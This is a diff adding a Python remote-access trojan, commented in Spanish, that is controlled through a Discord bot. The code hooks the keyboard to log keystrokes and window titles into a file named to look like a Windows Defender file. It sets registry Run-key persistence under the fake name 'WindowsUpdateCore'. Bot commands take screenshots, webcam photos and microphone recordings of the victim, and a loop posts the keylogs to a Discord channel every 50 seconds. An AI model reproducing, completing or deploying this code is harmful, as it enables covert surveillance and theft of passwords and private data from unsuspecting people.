@@ -1,0 +1,556 @@
+import discord
+from discord.ext import commands, tasks
+import ctypes
+from ctypes import wintypes
+import io
+import os
+import sys
+import threading
+import time
+from datetime import datetime
+import cv2
+import numpy as np
+import wave
+import pyaudio
+import math
+import base64
+import asyncio
+
+# --- CONFIGURACIÓN ---
+def get_config():
+    # Esta es tu cadena codificada (obtenida en el Paso A)
+    encoded_token = "TOKEN CODIFICADO EN BASE64"
+    return base64.b64decode(encoded_token).decode()
+
+TOKEN = get_config()
+LOG_FILE = os.path.join(os.getenv('APPDATA'), "WinDef_Service_Metadata.dat")
+
+
+# Retraso aleatorio de entre 30 y 60 segundos antes de conectar el bot
+time.sleep(45)
+key_buffer = "" # Buffer para almacenar las pulsaciones antes de escribir en el archivo
+
+
+
+# --- CONFIGURACIÓN DE CTYPES ---
+# Definiciones para funciones de Windows API
+user32 = ctypes.WinDLL('user32', use_last_error=True)
+kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+winmm = ctypes.WinDLL('winmm', use_last_error=True)
+gdi32 = ctypes.WinDLL('gdi32', use_last_error=True)
+shell32 = ctypes.WinDLL('shell32', use_last_error=True)
+
+# Constantes para Windows API
+WH_KEYBOARD_LL = 13
+WM_KEYDOWN  = 0x0100
+WM_KEYUP = 0x0101
+WM_SYSKEYDOWN = 0x0104
+WM_SYSKEYUP = 0x0105
+VK_SHIFT = 0x10
+VK_CONTROL = 0x11
+VK_MENU = 0x12
+VK_CAPITAL = 0x14
+VK_NUMLOCK = 0x90
+VK_SCROLL = 0x91
+VK_LWIN = 0x5B
+VK_RWIN = 0x5C
+SM_CMONITORS = 80
+SM_CXSCREEN = 0
+SM_CYSCREEN = 1
+SRCCOPY = 0x00CC0020
+DIB_RGB_COLORS = 0
+BI_RGB = 0
+CSIDL_STARTUP = 7
+SHGFP_TYPE_CURRENT = 0
+
+# Estructuras para Windows API
+class KBDLLHOOKSTRUCT(ctypes.Structure):
+    _fields_ = [
+        ("vkCode", wintypes.DWORD),
+        ("scanCode", wintypes.DWORD),
+        ("flags", wintypes.DWORD),
+        ("time", wintypes.DWORD),
+        ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))
+    ]
+
+class BITMAPINFOHEADER(ctypes.Structure):
+    _fields_ = [
+        ("biSize", wintypes.DWORD),
+        ("biWidth", wintypes.LONG),
+        ("biHeight", wintypes.LONG),
+        ("biPlanes", wintypes.WORD),
+        ("biBitCount", wintypes.WORD),
+        ("biCompression", wintypes.DWORD),
+        ("biSizeImage", wintypes.DWORD),
+        ("biXPelsPerMeter", wintypes.LONG),
+        ("biYPelsPerMeter", wintypes.LONG),
+        ("biClrUsed", wintypes.DWORD),
+        ("biClrImportant", wintypes.DWORD)
+    ]
+
+class BITMAPINFO(ctypes.Structure):
+    _fields_ = [
+        ("bmiHeader", BITMAPINFOHEADER),
+        ("bmiColors", wintypes.DWORD * 3)
+    ]
+
+# Definiciones de funciones de Windows API
+
+
+#USER32
+user32.GetAsyncKeyState.argtypes = [wintypes.INT]
+user32.GetAsyncKeyState.restype = wintypes.SHORT
+
+user32.GetKeyState.argtypes = [wintypes.INT]
+user32.GetKeyState.restype = wintypes.SHORT
+
+user32.GetSystemMetrics.argtypes = [ctypes.c_int]
+user32.GetSystemMetrics.restype = ctypes.c_int
+
+user32.SetWindowsHookExA.argtypes = [wintypes.INT, wintypes.LPVOID, wintypes.HINSTANCE, wintypes.DWORD]
+user32.SetWindowsHookExA.restype = wintypes.HHOOK
+
+user32.CallNextHookEx.restype = ctypes.wintypes.LPARAM
+user32.CallNextHookEx.argtypes = [ctypes.wintypes.HHOOK, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM]
+
+user32.UnhookWindowsHookEx.argtypes = [wintypes.HHOOK]
+user32.UnhookWindowsHookEx.restype = wintypes.BOOL
+
+user32.GetForegroundWindow.argtypes = []
+user32.GetForegroundWindow.restype = wintypes.HWND
+
+user32.GetWindowTextLengthW.argtypes = [wintypes.HWND]
+user32.GetWindowTextLengthW.restype = wintypes.INT
+
+user32.GetWindowTextW.argtypes = [wintypes.HWND, wintypes.LPWSTR, wintypes.INT]
+user32.GetWindowTextW.restype = wintypes.INT
+
+user32.GetDC.argtypes = [wintypes.HWND]
+user32.GetDC.restype = wintypes.HDC
+
+user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
+user32.ReleaseDC.restype = ctypes.c_int
+
+
+#GDI32
+gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
+gdi32.CreateCompatibleDC.restype = wintypes.HDC
+
+gdi32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int]
+gdi32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
+
+gdi32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
+gdi32.SelectObject.restype = wintypes.HGDIOBJ
+
+gdi32.GetDIBits.argtypes = [wintypes.HDC, wintypes.HBITMAP, wintypes.UINT, wintypes.UINT, ctypes.c_void_p, ctypes.c_void_p, wintypes.UINT]
+
+gdi32.BitBlt.restype = wintypes.BOOL
+
+gdi32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, wintypes.INT, wintypes.INT]
+gdi32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
+
+gdi32.GetDIBits.argtypes = [wintypes.HDC, wintypes.HBITMAP, wintypes.UINT, wintypes.UINT, 
+                          wintypes.LPVOID, ctypes.POINTER(BITMAPINFO), wintypes.UINT]
+gdi32.GetDIBits.restype = wintypes.INT
+
+gdi32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
+gdi32.DeleteObject.restype = wintypes.BOOL
+
+kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
+kernel32.GetModuleHandleW.restype = wintypes.HMODULE
+
+kernel32.GetCurrentThreadId.argtypes = []
+kernel32.GetCurrentThreadId.restype = wintypes.DWORD
+
+shell32.SHGetFolderPathW.argtypes = [wintypes.HWND, wintypes.INT, wintypes.HANDLE, wintypes.DWORD, wintypes.LPWSTR]
+shell32.SHGetFolderPathW.restype = ctypes.c_long 
+
+# --- VARIABLES GLOBALES ---
+hook = None
+last_window = None
+
+# --- CONFIGURACIÓN DEL BOT DE DISCORD ---
+intents = discord.Intents.default()
+intents.message_content = True 
+bot = commands.Bot(command_prefix='/', intents=intents)
+
+# --- RUTINA DE PERSISTENCIA (AUTO-INICIO) CON CTYPES ---
+def set_silent_persistence():
+    """Crea persistencia en el registro de Windows usando ctypes."""
+    try:
+        # Nombre que aparecerá en el registro (debe sonar legítimo)
+        app_name = "WindowsUpdateCore" 
+        exe_path = sys.executable
+
+        # Acceso a la API de Registro
+        advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)
+        
+        # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+        HKEY_CURRENT_USER = 0x80000001
+        KEY_WRITE = 0x20006
+        REG_SZ = 1
+
+        phk_result = wintypes.HANDLE()
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+
+        # 1. Abrir la clave del registro
+        if advapi32.RegOpenKeyExW(HKEY_CURRENT_USER, subkey, 0, KEY_WRITE, ctypes.byref(phk_result)) == 0:
+            # 2. Establecer el valor (ruta del exe)
+            advapi32.RegSetValueExW(phk_result, app_name, 0, REG_SZ, exe_path, (len(exe_path) + 1) * 2)
+            # 3. Cerrar la clave
+            advapi32.RegCloseKey(phk_result)
+            return True
+    except Exception:
+        pass
+    return False
+
+# --- LÓGICA DE CAPTURA PANTALLA CON CTYPES ---
+
+import mss
+import mss.tools
+
+def capture_multiple_screens():
+    """Detecta monitores y captura cada uno por separado."""
+    captured_paths = []
+    with mss.mss() as sct:
+        # Detectamos cuántos monitores hay (sct.monitors[0] es el total)
+        monitors = sct.monitors
+        
+        if len(monitors) <= 1:
+            return None # No se detectaron monitores físicos individuales
+
+        # Iteramos desde el 1 hasta el final
+        for i in range(1, len(monitors)):
+            filename = f"monitor_{i}_{datetime.now().strftime('%H%M%S')}.png"
+            output = os.path.join(os.getenv('APPDATA'), filename)
+            
+            # Captura específicamente el monitor 'i'
+            sct_img = sct.grab(monitors[i])
+            mss.tools.to_png(sct_img.rgb, sct_img.size, output=output)
+            
+            captured_paths.append((i, output))
+            
+    return captured_paths
+
+
+
+# --- LÓGICA DE CAPTURA CAMARA CON CTYPES ---
+def capture_cam():
+    """Captura imagen de la cámara usando ctypes y OpenCV."""
+    try:
+        # Usar DirectShow a través de ctypes para capturar de la cámara
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
+        if ret:
+            _, buffer = cv2.imencode('.jpg', frame)
+            cap.release()
+            return io.BytesIO(buffer)
+        cap.release()
+    except Exception as e:
+        print(f"Error al capturar cámara: {e}")
+    return None
+
+# --- LÓGICA DE CAPTURA DE AUDIO CON CTYPES ---
+import math # Necesario para redondear hacia arriba
+
+def capture_audio(duration=15):
+    """Graba audio del micrófono asegurando la duración exacta."""
+    try:
+        sample_rate = 44100
+        channels = 1
+        format = pyaudio.paInt16
+        chunk = 1024
+        
+        filename = os.path.join(os.getenv('APPDATA'), "temp_audio.wav")
+        audio = pyaudio.PyAudio()
+        
+        stream = audio.open(format=format, channels=channels, 
+                           rate=sample_rate, input=True,
+                           frames_per_buffer=chunk)
+        
+        frames = []
+        
+        # CORRECCIÓN 1: math.ceil asegura que no perdamos fragmentos por redondeo
+        # CORRECCIÓN 2: Añadimos un pequeño margen de 0.2s para compensar el inicio del hardware
+        total_chunks = math.ceil((sample_rate / chunk) * (duration + 0.2))
+        
+        for i in range(0, total_chunks):
+            # CORRECCIÓN 3: exception_on_overflow=False evita pausas si el PC se pone lento
+            data = stream.read(chunk, exception_on_overflow=False)
+            frames.append(data)
+        
+        stream.stop_stream()
+        stream.close()
+        
+        # Guardar archivo
+        wf = wave.open(filename, 'wb')
+        wf.setnchannels(channels)
+        # Importante: Obtener el tamaño de muestra antes de terminar audio
+        sample_size = audio.get_sample_size(format)
+        wf.setsampwidth(sample_size)
+        wf.setframerate(sample_rate)
+        wf.writeframes(b''.join(frames))
+        wf.close()
+        
+        audio.terminate()
+        return filename
+        
+    except Exception as e:
+        print(f"Error al grabar audio: {e}")
+        return None
+
+
+# --- KEYLOGGER CON CTYPES ---
+def low_level_keyboard_handler(nCode, wParam, lParam):
+    """Manejador del hook de teclado de bajo nivel corregido."""
+    global last_window
+    
+    if nCode >= 0:
+        if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
+            kb_struct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
+            vk_code = kb_struct.vkCode
+            
+            # 1. Obtener ventana activa actual (Cabecera)
+            hwnd = user32.GetForegroundWindow()
+            if hwnd != last_window:
+                last_window = hwnd
+                window_title_length = user32.GetWindowTextLengthW(hwnd) + 1
+                window_title = ctypes.create_unicode_buffer(window_title_length)
+                user32.GetWindowTextW(hwnd, window_title, window_title_length)
+                
+                with open(LOG_FILE, "a", encoding="utf-8") as f:
+                    f.write(f"\n\n[Ventana: {window_title.value} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
+            
+            # 2. PROCESAR TECLA (Lógica mejorada)
+            key_str = ""
+            
+            # Diccionario extendido de teclas especiales
+            special_keys = {
+                8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]\n", 20: "[CAPSLOCK]", 
+                27: "[ESC]", 32: " ", 46: "[DELETE]", 160: "[LSHIFT]", 
+                161: "[RSHIFT]", 162: "[LCTRL]", 163: "[RCTRL]", 164: "[LALT]", 
+                165: "[RALT]", 91: "[LWIN]", 92: "[RWIN]"
+            }
+
+            if vk_code in special_keys:
+                key_str = special_keys[vk_code]
+            else:
+                # Detectar estado de SHIFT y CAPS LOCK para minúsculas/mayúsculas
+                shift = (user32.GetKeyState(0x10) & 0x8000) != 0
+                caps = (user32.GetKeyState(0x14) & 1) != 0
+                
+                try:
+                    # Convertir código a carácter
+                    char = chr(vk_code)
+                    # Si SHIFT y CAPS están activos, se anulan (XOR)
+                    if shift ^ caps:
+                        key_str = char.upper()
+                    else:
+                        key_str = char.lower()
+                except:
+                    key_str = f"[{vk_code}]"
+
+            # 3. Escribir en archivo de log
+            if key_str and key_str != "[CAPSLOCK]":
+                with open(LOG_FILE, "a", encoding="utf-8") as f:
+                    f.write(key_str)
+    
+    # IMPORTANTE: Asegurar que el retorno sea compatible con LPARAM
+    res = user32.CallNextHookEx(None, nCode, wParam, lParam)
+    return ctypes.wintypes.LPARAM(res).value
+
+# --- CONFIGURACIÓN DEL HOOK ---
+CMPFUNC = ctypes.WINFUNCTYPE(ctypes.wintypes.LPARAM, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)
+hook_proc = CMPFUNC(low_level_keyboard_handler)
+
+user32.SetWindowsHookExA.argtypes = [
+    ctypes.c_int, 
+    ctypes.c_void_p, 
+    ctypes.wintypes.HINSTANCE, 
+    ctypes.wintypes.DWORD
+]
+user32.SetWindowsHookExA.restype = ctypes.wintypes.HHOOK
+
+# Instalación usando cast para asegurar compatibilidad
+hook = user32.SetWindowsHookExA(13, ctypes.cast(hook_proc, ctypes.c_void_p), kernel32.GetModuleHandleW(None), 0)
+
+def start_keylogger():
+    
+    global hook, hook_proc
+    
+    # 1. Warm-up: Abre el archivo una vez para que el sistema operativo esté listo
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(f"\n--- Sesión iniciada: {datetime.now()} ---\n")
+
+    # 2. Definir hook_proc como global para que el Garbage Collector no lo borre
+    # Usamos wintypes.LPARAM para el retorno (compatible con 64 bits)
+    HOOK_TYPE = ctypes.WINFUNCTYPE(ctypes.wintypes.LPARAM, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)
+    hook_proc = HOOK_TYPE(low_level_keyboard_handler)
+    
+    WH_KEYBOARD_LL = 13
+    h_module = kernel32.GetModuleHandleW(None)
+    
+    # 3. Instalar Hook
+    hook = user32.SetWindowsHookExA(
+        WH_KEYBOARD_LL, 
+        ctypes.cast(hook_proc, ctypes.c_void_p), 
+        h_module, 
+        0
+    )
+    
+    msg = wintypes.MSG()
+    while user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != 0:
+        user32.TranslateMessage(ctypes.byref(msg))
+        user32.DispatchMessageA(ctypes.byref(msg))
+
+# --- COMANDOS DEL BOT ---
+# --- TAREA AUTOMÁTICA (EN VIVO CADA X SEG) ---
+@tasks.loop(seconds=50)
+async def enviar_logs_vivos():
+    canal = bot.get_channel(1503671412580290601)
+    if canal and os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
+        with open(LOG_FILE, "r", encoding="utf-8") as f:
+            contenido = f.read()
+        
+        if len(contenido) > 1900:
+            contenido = contenido[:1900] + "... [Truncado]"
+        
+        await canal.send(f"⌨️ **Logs en vivo ({datetime.now().strftime('%H:%M:%S')}):**\n```{contenido}```")
+        open(LOG_FILE, 'w').close() # Vacía el archivo tras enviar
+
+# --- 2. FUNCIÓN WIN32 AISLADA (Para evitar congelamiento) ---
+def _conseguir_datos_win32():
+    """Función síncrona aislada para evitar congelar Discord."""
+    try:
+        k32 = ctypes.WinDLL('kernel32', use_last_error=True)
+        a32 = ctypes.WinDLL('advapi32', use_last_error=True)
+        
+        comp_buf = ctypes.create_unicode_buffer(16)
+        comp_size = ctypes.wintypes.DWORD(16)
+        k32.GetComputerNameW(comp_buf, ctypes.byref(comp_size))
+        
+        user_buf = ctypes.create_unicode_buffer(257)
+        user_size = ctypes.wintypes.DWORD(257)
+        a32.GetUserNameW(user_buf, ctypes.byref(user_size))
+        
+        return comp_buf.value, user_buf.value
+    except:
+        return "Desconocido", "Desconocido"
+
+# --- 3. EVENTO ON_READY INTEGRADO ---
+@bot.event
+async def on_ready():
+    ID_CANAL_NOTIFICACIONES = ID DEL CANAL 
+    print(f"[+] Bot conectado como {bot.user}")
+    
+    # ACTIVACIÓN DE LA TAREA: Aquí iniciamos el bucle automático de 50 segundos
+    if not enviar_logs_vivos.is_running():
+        enviar_logs_vivos.start()
+        print("[+] Bucle de logs en vivo iniciado.")
+    
+    try:
+        loop = asyncio.get_event_loop()
+        nombre_pc, usuario_target = await loop.run_in_executor(None, _conseguir_datos_win32)
+        
+        fecha_hora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
+        canal = bot.get_channel(ID_CANAL_NOTIFICACIONES)
+        if canal:
+            embed = discord.Embed(
+                title="🌐 ¡Nuevo Equipo Conectado!",
+                color=discord.Color.green(),
+                description="Se ha establecido conexión con una máquina mediante Win32 API asíncrona."
+            )
+            embed.add_field(name="🖥️ Equipo Target", value=f"`{nombre_pc}`", inline=True)
+            embed.add_field(name="👤 Usuario Target", value=f"`{usuario_target}`", inline=True)
+            embed.add_field(name="📅 Fecha/Hora", value=f"`{fecha_hora}`", inline=False)
+            embed.set_footer(text=f"ID de sesión: {bot.user}")
+            
+            await canal.send(embed=embed)
+            print(f"[+] Alerta enviada con éxito para {nombre_pc}")
+        else:
+            print("[-] Error: ID de canal no encontrado o el bot no tiene acceso a él.")
+            
+    except Exception as e:
+        print(f"[-] Error en el procesamiento de on_ready: {e}")
+
+# --- 4. COMANDOS DEL BOT ---
+@bot.command()
+async def pantalla(ctx):
+    await ctx.send(f"🖥️ Validando monitores en **{ctx.author.name}**...")
+    
+    try:
+        capturas = capture_multiple_screens()
+        
+        if not capturas:
+            await ctx.send("❌ Error: No se detectaron monitores físicos independientes.")
+            return
+
+        for num, ruta in capturas:
+            await ctx.send(f"✅ **Monitor {num} detectado:**", file=discord.File(ruta))
+            os.remove(ruta) # Limpieza inmediata
+            
+    except OverflowError:
+        await ctx.send("⚠️ Error de desbordamiento: La resolución de pantalla es inusual para los cálculos actuales.")
+    except Exception as e:
+        await ctx.send(f"[-] Error interno: {e}")
+
+@bot.command()
+async def otro_comando(ctx):
+    pass
+
+@bot.command()
+async def camara(ctx):
+    img = capture_cam()
+    if img:
+        await ctx.send(f"📸 Foto de cámara ({datetime.now()}):", file=discord.File(img, 'camera.jpg'))
+    else:
+        await ctx.send("❌ Error: Cámara no disponible.")
+
+@bot.command()
+async def escuchar(ctx, segundos: int = 15):
+    if segundos > 60:
+        await ctx.send("⚠️ Por seguridad, el máximo es de 60 segundos.")
+        return
+
+    await ctx.send(f"🎙️ Grabando audio por {segundos} segundos... por favor espera.")
+    audio_path = capture_audio(segundos)
+    
+    if audio_path and os.path.exists(audio_path):
+        await ctx.send(f"🎧 Audio capturado ({segundos}s):", file=discord.File(audio_path))
+        os.remove(audio_path)  
+    else:
+        await ctx.send("❌ No se pudo acceder al micrófono o grabar el audio.")
+
+@bot.command()
+async def detener_logs(ctx):
+    if enviar_logs_vivos.is_running():
+        enviar_logs_vivos.stop()
+        await ctx.send("🛑 **Envío de logs en vivo detenido.** El keylogger seguirá registrando en el archivo local.")
+    else:
+        await ctx.send("⚠️ El envío ya estaba detenido.")
+
+@bot.command()
+async def activar_logs(ctx):
+    if not enviar_logs_vivos.is_running():
+        enviar_logs_vivos.start()
+        await ctx.send("✅ **Envío de logs en vivo reactivado.**")
+    else:
+        await ctx.send("⚠️ El envío ya está en curso.")
+
+@bot.command()
+async def leer_log(ctx):
+    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
+        await ctx.send("⌨️ **Registro de teclas acumulado:**", file=discord.File(LOG_FILE))
+        open(LOG_FILE, 'w').close() 
+    else:
+        await ctx.send("📭 No hay registros nuevos.")
+
+
+# --- EJECUCIÓN PRINCIPAL ---
+if __name__ == "__main__":
+    # Hilo para el keylogger (corre siempre en segundo plano)
+    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
+    keylogger_thread.start()
+    
+    bot.run(TOKEN)
